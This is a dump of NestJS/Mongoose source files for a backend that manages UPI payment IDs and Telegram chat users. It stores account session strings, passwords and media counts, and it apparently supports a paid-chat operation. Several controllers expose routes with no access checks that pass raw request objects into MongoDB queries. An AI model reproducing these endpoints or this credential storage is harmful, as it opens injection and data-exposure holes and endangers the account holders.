from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { UpiIdService } from './upi-ids.service';\r\n\r\n@ApiTags('UPI Ids')\r\n@Controller('upi-ids')\r\nexport class UpiIdController {\r\n  constructor(private readonly UpiIdService: UpiIdService) { }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get Upi Ids' })\r\n  async findOne(): Promise<any> {\r\n    return this.UpiIdService.findOne();\r\n  }\r\n\r\n  @Patch()\r\n  @ApiOperation({ summary: 'Update Upi Ids' })\r\n  @ApiBody({ type: Object })\r\n  async update(@Body() updateUpiIdsdto: any): Promise<any> {\r\n    return this.UpiIdService.update(updateUpiIdsdto);\r\n  }\r\n\r\n}\r\n","import { Module, Global } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { UpiIdService } from './upi-ids.service';\r\nimport { UpiIdController } from './upi-ids.controller';\r\nimport { UpiIdSchema } from './upi-ids.schema';\r\nimport { NpointModule } from '../n-point/npoint.module';\r\n\r\n@Global()\r\n@Module({\r\n  imports: [\r\n    UpiIdModule,\r\n    NpointModule,\r\n    MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: UpiIdSchema }]),\r\n  ],\r\n  providers: [UpiIdService],\r\n  controllers: [UpiIdController],\r\n  exports: [UpiIdService],\r\n})\r\nexport class UpiIdModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport mongoose, { Document } from 'mongoose';\r\n\r\nexport type UpiIdDocument = UpiId & Document;\r\n\r\n@Schema({\r\n  versionKey: false, autoIndex: true, strict: false, timestamps: true,\r\n  toJSON: {\r\n    virtuals: true,\r\n    transform: (doc, ret) => {\r\n      delete ret._id;\r\n    },\r\n  },\r\n})\r\nexport class UpiId { }\r\n\r\nexport const UpiIdSchema = SchemaFactory.createForClass(UpiId);\r\nUpiIdSchema.add({ type: mongoose.Schema.Types.Mixed });\r\n\r\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { UpiId } from './upi-ids.schema';\r\nimport axios from 'axios';\r\nimport { areJsonsNotSame, mapToJson } from '../../utils';\r\nimport { NpointService } from '../n-point/npoint.service';\r\n\r\n@Injectable()\r\nexport class UpiIdService {\r\n    private upiIds = {}\r\n    constructor(@InjectModel('UpiIdModule') private UpiIdModel: Model<UpiId>,\r\n        private npointSerive: NpointService\r\n    ) {\r\n        this.UpiIdModel.findOne({}).exec().then((data) => {\r\n            this.upiIds = data;\r\n            console.log(\"Refreshed UPIs\")\r\n        })\r\n        setInterval(async () => {\r\n            await this.refreshUPIs();\r\n            await this.checkNpoint();\r\n        }, 5 * 60 * 1000);\r\n    }\r\n\r\n    async OnModuleInit() {\r\n        console.log(\"Config Module Inited\")\r\n    }\r\n\r\n    async refreshUPIs() {\r\n        console.log(\"Refreshed UPIs\")\r\n        this.upiIds = await this.UpiIdModel.findOne({}).exec();\r\n    }\r\n\r\n    async checkNpoint() {\r\n        const upiIds = (await axios.get('https://api.npoint.io/54baf762fd873c55c6b1')).data;\r\n        const existingUpiIds = await this.findOne();\r\n        if (areJsonsNotSame(upiIds, existingUpiIds)) {\r\n            await this.npointSerive.updateDocument(\"54baf762fd873c55c6b1\", this.upiIds)\r\n        }\r\n    }\r\n\r\n    async findOne(): Promise<any> {\r\n        if (Object.keys(this.upiIds).length > 0) {\r\n            return this.upiIds\r\n        }\r\n        const result = await this.UpiIdModel.findOne({}).exec();\r\n        this.upiIds = result\r\n        console.log(\"Refreshed UPIs\")\r\n        return result\r\n    }\r\n\r\n    async update(updateClientDto: any): Promise<any> {\r\n        delete updateClientDto['_id']\r\n        const updatedUser = await this.UpiIdModel.findOneAndUpdate(\r\n            {}, // Assuming you want to update the first document found in the collection\r\n            { $set: { ...updateClientDto } },\r\n            { new: true, upsert: true }\r\n        ).exec();\r\n        this.upiIds = updatedUser;\r\n        console.log(\"Refreshed UPIs\")\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`UpiIdModel not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateUserDataDto {\r\n    @ApiProperty({ example: '5787751360', description: 'Chat ID' })\r\n    chatId: string;\r\n\r\n    @ApiProperty({ example: 1, description: 'Total count' })\r\n    totalCount: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'Picture count' })\r\n    picCount: number;\r\n\r\n    @ApiProperty({ example: 1718802722566, description: 'Last message timestamp' })\r\n    lastMsgTimeStamp: number;\r\n\r\n    @ApiProperty({ example: 1718802742567, description: 'Limit time' })\r\n    limitTime: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'Paid count' })\r\n    paidCount: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'Profile count' })\r\n    prfCount: number;\r\n\r\n    @ApiProperty({ example: 1, description: 'Can reply' })\r\n    canReply: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'Pay amount' })\r\n    payAmount: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'highestPayAmount' })\r\n    highestPayAmount: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'cheatCount', default: 0 })\r\n    cheatCount: number;\r\n\r\n    @ApiProperty({ example: 0, description: 'callTime', default: 0 })\r\n    callTime: number;\r\n\r\n    @ApiProperty({ example: 'بـِـعٰ۬ێډ الۿٰٕقاوٰ۬ێ ٴ🦅', description: 'Username' })\r\n    username: string;\r\n\r\n    @ApiProperty({ example: '-7250939091939055173', description: 'Access hash' })\r\n    accessHash: string;\r\n\r\n    @ApiProperty({ example: true, description: 'Paid reply status' })\r\n    paidReply: boolean;\r\n\r\n    @ApiProperty({ example: false, description: 'Demo given status' })\r\n    demoGiven: boolean;\r\n\r\n    @ApiProperty({ example: false, description: 'Second show status' })\r\n    secondShow: boolean;\r\n\r\n    @ApiProperty({ example: 'sneha', description: 'Profile name' })\r\n    profile: string;\r\n\r\n    @ApiProperty({ example: false, description: 'Pics Sent status' })\r\n    picsSent: boolean;\r\n\r\n    @ApiProperty({ example: [], description: 'videos' })\r\n    videos: number[];\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, TransformFnParams } from 'class-transformer';\r\n\r\nexport class SearchDto {\r\n  @ApiPropertyOptional({ description: 'Total count', type: Number })\r\n  totalCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Picture count', type: Number })\r\n  picCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Last message timestamp', type: Number })\r\n  lastMsgTimeStamp?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Limit time', type: Number })\r\n  limitTime?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Paid count', type: Number })\r\n  paidCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Profile count', type: Number })\r\n  prfCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Can reply', type: Number })\r\n  canReply?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Pay amount', type: Number })\r\n  payAmount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Username' })\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Access hash' })\r\n  accessHash?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Paid reply status', type: Boolean })\r\n  paidReply?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Demo given status', type: Boolean })\r\n  demoGiven?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Second show status', type: Boolean })\r\n  secondShow?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Profile name' })\r\n  @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\r\n  profile?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Chat ID' })\r\n  chatId?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Pics Sent status' })\r\n  picsSent?: boolean;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreateUserDataDto } from './create-user-data.dto';\r\n\r\nexport class UpdateUserDataDto extends PartialType(CreateUserDataDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type UserDataDocument = UserData & Document;\r\n\r\n@Schema({\r\n    collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,\r\n    toJSON: {\r\n        virtuals: true,\r\n        transform: (doc, ret) => {\r\n            delete ret._id;\r\n        },\r\n    },\r\n})\r\nexport class UserData {\r\n    @Prop({ required: true })\r\n    chatId: string;\r\n\r\n    @Prop({ required: true })\r\n    totalCount: number;\r\n\r\n    @Prop({ required: true })\r\n    picCount: number;\r\n\r\n    @Prop({ required: true })\r\n    lastMsgTimeStamp: number;\r\n\r\n    @Prop({ required: true })\r\n    limitTime: number;\r\n\r\n    @Prop({ required: true })\r\n    paidCount: number;\r\n\r\n    @Prop({ required: true })\r\n    prfCount: number;\r\n\r\n    @Prop({ required: true })\r\n    canReply: number;\r\n\r\n    @Prop({ required: true })\r\n    payAmount: number;\r\n\r\n    @Prop({ required: true })\r\n    username: string;\r\n\r\n    @Prop({ required: true })\r\n    accessHash: string;\r\n\r\n    @Prop({ required: true })\r\n    paidReply: boolean;\r\n\r\n    @Prop({ required: true })\r\n    demoGiven: boolean;\r\n\r\n    @Prop({ required: true })\r\n    secondShow: boolean;\r\n\r\n    @Prop({ required: true, default: 0 })\r\n    fullShow: number;\r\n\r\n    @Prop({ required: true })\r\n    profile: string;\r\n\r\n    @Prop({ required: true })\r\n    picSent: boolean;\r\n\r\n    @Prop({ required: true })\r\n    highestPayAmount: number;\r\n\r\n    @Prop({ required: true })\r\n    cheatCount: number;\r\n\r\n    @Prop({ required: true })\r\n    callTime: number;\r\n\r\n    @Prop({ required: false, default:[] })\r\n    videos: number[];\r\n}\r\n\r\nexport const UserDataSchema = SchemaFactory.createForClass(UserData);\r\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery } from '@nestjs/swagger';\r\nimport { UserDataService } from './user-data.service';\r\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\r\nimport { UserData } from './schemas/user-data.schema';\r\nimport { SearchDto } from './dto/search-user-data.dto';\r\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\r\n\r\n@ApiTags('UserData of TG clients')\r\n@Controller('userData')\r\nexport class UserDataController {\r\n  constructor(private readonly userDataService: UserDataService) {}\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  async create(@Body() createUserDataDto: CreateUserDataDto): Promise<UserData> {\r\n    return this.userDataService.create(createUserDataDto);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  async search(@Query() query: SearchDto): Promise<UserData[]> {\r\n    return this.userDataService.search(query);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  async findAll(): Promise<UserData[]> {\r\n    return this.userDataService.findAll();\r\n  }\r\n\r\n\r\n  @Patch('updateAll/:chatId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async updateAll(@Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<any> {\r\n    return this.userDataService.updateAll(chatId, updateUserDataDto);\r\n  }\r\n\r\n\r\n  @Get(':profile/:chatId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  async findOne(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\r\n    return this.userDataService.findOne(profile, chatId);\r\n  }\r\n\r\n  @Patch(':profile/:chatId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async update(@Param('profile') profile: string, @Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\r\n    return this.userDataService.update(profile, chatId, updateUserDataDto);\r\n  }\r\n\r\n  @Delete(':profile/:chatId')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  async remove(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\r\n    return this.userDataService.remove(profile, chatId);\r\n  }\r\n\r\n  @Get('clear-count')\r\n  clearCount(@Query('chatId') chatId?: string) {\r\n    return this.userDataService.clearCount(chatId);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    try {\r\n      const { query, sort, limit, skip } = requestBody;\r\n      return await this.userDataService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw error;\r\n    }\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { UserData, UserDataSchema } from './schemas/user-data.schema';\r\nimport { UserDataService } from './user-data.service';\r\nimport { UserDataController } from './user-data.controller';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: UserData.name, schema: UserDataSchema, collection: \"userData\" }])],\r\n  controllers: [UserDataController],\r\n  providers: [UserDataService],\r\n  exports: [UserDataService]\r\n})\r\nexport class UserDataModule { }\r\n","import { BadRequestException, Injectable, InternalServerErrorException, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { UserData, UserDataDocument } from './schemas/user-data.schema';\r\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\r\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\r\nimport { parseError } from '../../utils';\r\n\r\n@Injectable()\r\nexport class UserDataService {\r\n    private callCounts: Map<string, number> = new Map();\r\n    constructor(@InjectModel(UserData.name) private userDataModel: Model<UserDataDocument>) {}\r\n\r\n    async create(createUserDataDto: CreateUserDataDto): Promise<UserData> {\r\n        const createdUser = new this.userDataModel(createUserDataDto);\r\n        return createdUser.save();\r\n    }\r\n\r\n    async findAll(): Promise<UserData[]> {\r\n        return await this.userDataModel.find().exec();\r\n    }\r\n\r\n    async findOne(profile: string, chatId: string): Promise<UserData & { count?: number }> {\r\n        const user = (await this.userDataModel.findOne({ profile, chatId }).exec())?.toJSON();\r\n        if (!user) {\r\n            console.warn(`UserData with ID \"${profile} - ${chatId}\" not found`);\r\n        }\r\n        const currentCount = this.callCounts.get(chatId) || 0;\r\n        this.callCounts.set(chatId, currentCount + 1);\r\n        if (user) {\r\n            return { ...user, count: this.callCounts.get(chatId) };\r\n        } else {\r\n            return undefined\r\n        }\r\n    }\r\n\r\n    clearCount(chatId?: string): string {\r\n        if (chatId) {\r\n            this.callCounts.delete(chatId);\r\n            return `Count cleared for chatId: ${chatId}`;\r\n        } else {\r\n            this.callCounts.clear();\r\n            return 'All counts cleared.';\r\n        }\r\n    }\r\n\r\n    async update(profile: string, chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\r\n        delete updateUserDataDto['_id']\r\n        console.log(updateUserDataDto)\r\n        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\r\n        if (!updatedUser) {\r\n            console.warn(`UserData with ID \"${chatId}\" not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n    async updateAll(chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<any> {\r\n        delete updateUserDataDto['_id']\r\n        const updatedUser = await this.userDataModel.updateMany({ chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\r\n        if (!updatedUser) {\r\n            console.warn(`UserData with ID \"${chatId}\" not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n    async remove(profile: string, chatId: string): Promise<UserData> {\r\n        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).exec();\r\n        if (!deletedUser) {\r\n            console.warn(`UserData with ID \"${chatId}\" not found`);\r\n        }\r\n        return deletedUser;\r\n    }\r\n\r\n    async search(filter: any): Promise<UserData[]> {\r\n        console.log(filter)\r\n        if (filter.firstName) {\r\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\r\n        }\r\n        console.log(filter)\r\n        return this.userDataModel.find(filter).exec();\r\n    }\r\n\r\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<UserData[]> {\r\n        try {\r\n            if (!query) {\r\n                throw new BadRequestException('Query is invalid.');\r\n            }\r\n            const queryExec = this.userDataModel.find(query);\r\n\r\n            if (sort) {\r\n                queryExec.sort(sort);\r\n            }\r\n\r\n            if (limit) {\r\n                queryExec.limit(limit);\r\n            }\r\n\r\n            if (skip) {\r\n                queryExec.skip(skip);\r\n            }\r\n\r\n            return await queryExec.exec();\r\n        } catch (error) {\r\n            throw new InternalServerErrorException(error.message);\r\n        }\r\n    }\r\n\r\n    async resetPaidUsers() {\r\n        try {\r\n            const entry = await this.userDataModel.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }] }, {\r\n                $set: {\r\n                    totalCount: 10,\r\n                    limitTime: Date.now(),\r\n                    paidReply: true\r\n                }\r\n            });\r\n        } catch (error) {\r\n            parseError(error)\r\n        }\r\n    }\r\n}\r\n","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\n\r\nexport class CreateUserDto {\r\n  @ApiProperty({ description: 'Mobile number of the user', example: '917330803480' })\r\n  mobile: string;\r\n\r\n  @ApiProperty({ description: 'Session information of the user', example: 'string' })\r\n  session: string;\r\n\r\n  @ApiProperty({ description: 'First name of the user', example: 'Praveen' })\r\n  firstName: string;\r\n\r\n  @ApiProperty({ description: 'Last name of the user', example: null })\r\n  lastName?: string | null;\r\n\r\n  @ApiProperty({ description: 'Username of the user', example: null })\r\n  username?: string | null;\r\n\r\n  @ApiProperty({ description: 'Number of channels', example: 56 })\r\n  channels: number;\r\n\r\n  @ApiProperty({ description: 'Number of personal chats', example: 74 })\r\n  personalChats: number;\r\n\r\n  @ApiProperty({ description: 'Number of messages', example: 0 })\r\n  msgs: number;\r\n\r\n  @ApiProperty({ description: 'Total number of chats', example: 195 })\r\n  totalChats: number;\r\n\r\n  @ApiProperty({ description: 'Timestamp of last active', example: '2024-06-03' })\r\n  lastActive: string;\r\n\r\n  @ApiProperty({ description: 'Telegram ID of the user', example: '2022068676' })\r\n  tgId: string;\r\n\r\n  @ApiProperty({ description: 'TwoFA status', example: false })\r\n  twoFA: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Expiration status', example: false })\r\n  expired: boolean = false;\r\n\r\n  @ApiProperty({ description: 'password', example: \"pass\" })\r\n  password: string = null;\r\n\r\n  @ApiProperty({ description: 'Number of movies', example: 0 })\r\n  movieCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Number of photos', example: 0 })\r\n  photoCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Number of videos', example: 0 })\r\n  videoCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Gender of the user', example: null })\r\n  gender?: string | null;\r\n\r\n  @ApiProperty({ description: 'Number of other photos', example: 0 })\r\n  otherPhotoCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Number of other videos', example: 0 })\r\n  otherVideoCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Number of own photos', example: 0 })\r\n  ownPhotoCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Number of own videos', example: 0 })\r\n  ownVideoCount: number = 0;\r\n\r\n  @ApiProperty({ description: 'Number of contacts', example: 105 })\r\n  contacts: number = 0;\r\n\r\n  @ApiProperty({\r\n    description: 'Call details of the user',\r\n    example: {\r\n      outgoing: 1,\r\n      incoming: 0,\r\n      video: 1,\r\n      chatCallCounts: [],\r\n      totalCalls: 1,\r\n    },\r\n  })\r\n  calls: {\r\n    outgoing: number;\r\n    incoming: number;\r\n    video: number;\r\n    chatCallCounts: any[];\r\n    totalCalls: number;\r\n  };\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Call details of the user',\r\n    example: []\r\n  })\r\n  recentUsers: any[];\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, TransformFnParams, Type } from 'class-transformer';\r\nimport { IsOptional, IsBoolean, IsNumber, IsString } from 'class-validator';\r\n\r\nexport class SearchUserDto {\r\n  @ApiPropertyOptional({ description: 'Filter by Telegram ID' })\r\n  @IsOptional()\r\n  @IsString()\r\n  tgId?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by mobile number' })\r\n  @IsOptional()\r\n  @IsString()\r\n  mobile?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by twoFA status', type: Boolean })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  twoFA?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by Expiration status', type: Boolean })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  expired?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by session' })\r\n  @IsOptional()\r\n  @IsString()\r\n  session?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by first name' })\r\n  @IsOptional()\r\n  @IsString()\r\n  firstName?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by last name' })\r\n  @IsOptional()\r\n  @IsString()\r\n  lastName?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by username' })\r\n  @IsOptional()\r\n  @IsString()\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by channels count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  channels?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by personal chats count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  personalChats?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by demo given status', type: Boolean })\r\n  @Transform(({ value }: TransformFnParams) => value === 'true' || value === true)\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  demoGiven?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by messages count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  msgs?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by total chats count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  totalChats?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by last active timestamp' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  lastActive?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by movie count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  movieCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by photo count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  photoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by video count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  videoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by gender' })\r\n  @IsOptional()\r\n  @IsString()\r\n  gender?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by other photo count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  otherPhotoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by other video count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  otherVideoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by own photo count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  ownPhotoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by own video count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  ownVideoCount?: number;\r\n}\r\n","import { PartialType } from '@nestjs/mapped-types';\r\nimport { CreateUserDto } from './create-user.dto';\r\n\r\nexport class UpdateUserDto extends PartialType(CreateUserDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport mongoose from 'mongoose';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\n\r\nexport type UserDocument = User & Document;\r\n\r\n@Schema({\r\n  collection: 'users', versionKey: false, autoIndex: true, timestamps: true,\r\n  toJSON: {\r\n    virtuals: true,\r\n    transform: (doc, ret) => {\r\n      delete ret._id;\r\n    },\r\n  },\r\n})\r\nexport class User {\r\n  @ApiProperty()\r\n  @Prop({ required: true, unique: true })\r\n  mobile: string;\r\n\r\n  @ApiProperty()\r\n  @Prop({ required: true, unique: true })\r\n  session: string;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  firstName: string;\r\n\r\n  @ApiProperty({ required: false })\r\n  @Prop()\r\n  lastName: string | null;\r\n\r\n  @ApiProperty({ required: false })\r\n  @Prop()\r\n  username: string | null;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  channels: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  personalChats: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  demoGiven: boolean;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  msgs: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  totalChats: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  lastActive: string;\r\n\r\n  @ApiProperty()\r\n  @Prop({ required: true, unique: true })\r\n  tgId: string;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  movieCount: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  photoCount: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  videoCount: number;\r\n\r\n  @ApiProperty({ required: false })\r\n  @Prop()\r\n  gender: string | null;\r\n\r\n  @Prop({ required: false, type: Boolean })\r\n  twoFA: boolean = false\r\n\r\n  @Prop({ required: false, type: Boolean, default: false })\r\n  expired: boolean = false\r\n\r\n  @Prop({ required: false })\r\n  password: string = null\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  otherPhotoCount: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  otherVideoCount: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  ownPhotoCount: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  ownVideoCount: number;\r\n\r\n  @ApiProperty()\r\n  @Prop()\r\n  contacts: number;\r\n\r\n  @ApiProperty()\r\n  @Prop({\r\n    type: mongoose.Schema.Types.Mixed,\r\n    default: {\r\n      outgoing: 0,\r\n      incoming: 0,\r\n      video: 0,\r\n      chatCallCounts: [],\r\n      totalCalls: 0,\r\n    },\r\n  })\r\n  calls: {\r\n    outgoing: number;\r\n    incoming: number;\r\n    video: number;\r\n    chatCallCounts: any[];\r\n    totalCalls: number;\r\n  };\r\n\r\n  @ApiPropertyOptional()\r\n  @Prop({\r\n    type: mongoose.Schema.Types.Mixed,\r\n    default: [],\r\n    required: false,\r\n  })\r\n  recentUsers: any[];\r\n\r\n  \r\n}\r\n\r\nexport const UserSchema = SchemaFactory.createForClass(User);\r\n","import { Controller, Get, Post, Body, Param, Patch, Delete, Query } from '@nestjs/common';\r\nimport { UsersService } from './users.service';\r\nimport { User } from './schemas/user.schema';\r\nimport { ApiTags, ApiOperation, ApiParam } from '@nestjs/swagger';\r\nimport { SearchUserDto } from './dto/search-user.dto';\r\nimport { UpdateUserDto } from './dto/update-user.dto';\r\nimport { CreateUserDto } from './dto/create-user.dto';\r\n\r\n@ApiTags('Telegram Users') // Tag to categorize all endpoints in this controller\r\n@Controller('user')\r\nexport class UsersController {\r\n  constructor(private readonly usersService: UsersService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new user' })\r\n  async create(@Body() createUserDto: CreateUserDto) {\r\n    console.log(\"creating new user\")\r\n    return this.usersService.create(createUserDto);\r\n  }\r\n\r\n  @Get('/search')\r\n  @ApiOperation({ summary: 'Search users based on various parameters' })\r\n  async search(@Query() queryParams: SearchUserDto): Promise<User[]> {\r\n    return this.usersService.search(queryParams);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all users' })\r\n  async findAll() {\r\n    return this.usersService.findAll();\r\n  }\r\n\r\n  @Get(':tgId')\r\n  @ApiOperation({ summary: 'Get a user by tgId' })\r\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\r\n  async findOne(@Param('tgId') tgId: string) {\r\n    return this.usersService.findOne(tgId);\r\n  }\r\n\r\n  @Patch(':tgId')\r\n  @ApiOperation({ summary: 'Update a user by tgId' })\r\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\r\n  async update(@Param('tgId') tgId: string, @Body() updateUserDto: UpdateUserDto) {\r\n    return this.usersService.update(tgId, updateUserDto);\r\n  }\r\n\r\n  @Delete(':tgId')\r\n  @ApiOperation({ summary: 'Delete a user by tgId' })\r\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\r\n  async remove(@Param('tgId') tgId: string) {\r\n    return this.usersService.delete(tgId);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    const { query, sort, limit, skip } = requestBody;\r\n    try {\r\n      return await this.usersService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw error;  // You might want to handle errors more gracefully\r\n    }\r\n  }\r\n\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { UsersService } from './users.service';\r\nimport { UsersController } from './users.controller';\r\nimport { UserSchema } from './schemas/user.schema';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { ClientModule } from '../clients/client.module';\r\nimport { initModule } from 